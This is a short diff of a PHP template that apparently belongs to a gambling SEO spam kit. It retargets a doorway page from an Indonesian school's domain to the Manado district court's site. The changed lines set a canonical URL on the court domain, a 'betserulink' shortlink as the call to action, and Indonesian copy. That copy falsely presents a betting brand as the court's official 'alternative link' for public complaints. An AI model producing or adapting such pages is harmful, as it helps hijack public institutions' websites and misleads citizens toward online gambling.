@@ -44,14 +44,14 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://tamuramah.com/id/$dashbrand";
-$canonical = "https://smknu-tulungagung.sch.id/berita/$dashbrand";
+$canonical = "https://pn-manado.go.id/slide/$dashbrand";
 $cta = "https://t.ly/betserulink";
 $gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729171278/OIG1.lL3DsLBH1rjOd4mzGikn_mjqmzj.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Kompetensi Keahlian SMK NU Tulungagung";
-$desc = "Sekolah yang paling banyak digemari di wilayah Tulungagung yakni SMK NU banyak sekali fasilitas yang lengkap untuk mendukung setiap siswa dan siswi bisa belajar dengan baik dengan kurikulum merdeka belajar melalui platform $namabrand untuk belajar online dengan mudah.";
-$konten = "Sekolah yang paling banyak digemari di wilayah Tulungagung yakni SMK NU banyak sekali fasilitas yang lengkap untuk mendukung setiap siswa dan siswi bisa belajar dengan baik dengan kurikulum merdeka belajar melalui platform $namabrand untuk belajar online dengan mudah.";
+$judul = "$namabrand Layanan Pengadilan Negeri Manado Kelas 1A";
+$desc = "Lembaga pengadilan negeri Manado kini melayani serta bertanggung jawab untuk memberikan wadah kepada masyarakat jika ada pengaduan atau permasalahan pribadi maupun kelompok didalam sosial masyarakat bisa mengadukan melalui $namabrand link alternatif yang disediakan untuk warga.";
+$konten = "Lembaga pengadilan negeri Manado kini melayani serta bertanggung jawab untuk memberikan wadah kepada masyarakat jika ada pengaduan atau permasalahan pribadi maupun kelompok didalam sosial masyarakat bisa mengadukan melalui $namabrand link alternatif yang disediakan untuk warga.";
 ?>
 
 
